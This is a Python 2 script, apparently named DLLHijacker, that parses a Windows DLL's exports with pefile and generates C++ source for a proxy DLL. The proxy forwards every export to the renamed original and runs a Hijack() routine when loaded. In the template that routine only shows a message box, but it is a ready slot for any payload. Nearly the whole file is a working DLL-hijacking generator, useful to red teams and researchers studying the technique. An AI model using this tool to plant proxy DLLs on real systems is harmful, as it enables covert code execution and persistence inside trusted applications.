#!/usr/bin/python
#coding=utf-8

import os
import sys
import time
import pefile
import traceback

def generate(outfile, new_dllname, symbols):
    template = '''
#include <windows.h>

TEMPLATE_DLL_EXPORT
#define EXTERNC extern "C"
#define NAKED __declspec(naked)
#define EXPORT __declspec(dllexport)
#define ALCPP EXPORT NAKED
#define ALSTD EXTERNC EXPORT NAKED void __stdcall
#define ALCFAST EXTERNC EXPORT NAKED void __fastcall
#define ALCDECL EXTERNC NAKED void __cdecl

namespace DLLHijacker
{
    HMODULE m_hModule = NULL;
    DWORD m_dwReturn[17] = {0};

    inline BOOL WINAPI Load()
    {
        TCHAR tzPath[MAX_PATH];
        lstrcpy(tzPath, TEXT("TEMPLATE_NEW_DLLNAME"));
        m_hModule = LoadLibrary(tzPath);
        if (m_hModule == NULL)
            return FALSE;
        return (m_hModule != NULL);
    }
    inline VOID WINAPI Free()
    {
        if (m_hModule)
            FreeLibrary(m_hModule);
    }
    FARPROC WINAPI GetAddress(PCSTR pszProcName)
    {
        FARPROC fpAddress;
        CHAR szProcName[16];
        fpAddress = GetProcAddress(m_hModule, pszProcName);
        if (fpAddress == NULL)
        {
            if (HIWORD(pszProcName) == 0)
            {
                wsprintf(szProcName, "%d", pszProcName);
                pszProcName = szProcName;
            }
            ExitProcess(-2);
        }
        return fpAddress;
    }
}
using namespace DLLHijacker;
VOID Hijack()
{
    MessageBoxW(NULL, L"DLL Hijack! by DLLHijacker", L":)", 0);
}
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);
        if(Load())
            Hijack();
    }
    else if (dwReason == DLL_PROCESS_DETACH)
    {
        Free();
    }
    return TRUE;
}


'''

    export_text = ''
    for sym in symbols:
        export_text += '''#pragma comment(linker, "/EXPORT:%s=_DLLHijacker_%s,@%d")\n''' % (sym.name, sym.name, sym.ordinal)

    out = open(outfile, "w+")
    out.writelines(template
        .replace('TEMPLATE_DLL_EXPORT', export_text)
        .replace('TEMPLATE_NEW_DLLNAME', new_dllname))

    for sym in symbols:
        out.writelines('''
ALCDECL DLLHijacker_%s@%d(void)
{
    __asm POP m_dwReturn[0 * TYPE long];
    GetAddress("%s@%d")();
    __asm JMP m_dwReturn[0 * TYPE long];
}
''' % (sym.name, sym.ordinal, sym.name, sym.ordinal))
    
    out.close()

def usage():
    print 'Usage:', sys.argv[0], 'a.dll b.dll ...'
    sys.exit(0)

def run(filename):
    try:
        pe      = pefile.PE(filename)
        symbols = pe.DIRECTORY_ENTRY_EXPORT.symbols
        cppname = os.path.basename(filename) + '.cpp'

        print '[-] Processing', filename
        print '    - Output', cppname
        print '    - Number of symbols: ', len(symbols)

        generate(cppname, 'new_' + filename, symbols)

    except Exception as e:
        traceback.print_exc()
        pass

    print "\n"

if len(sys.argv) == 1:
    usage()
else:
    for arg in sys.argv[1:]:
        run(arg)

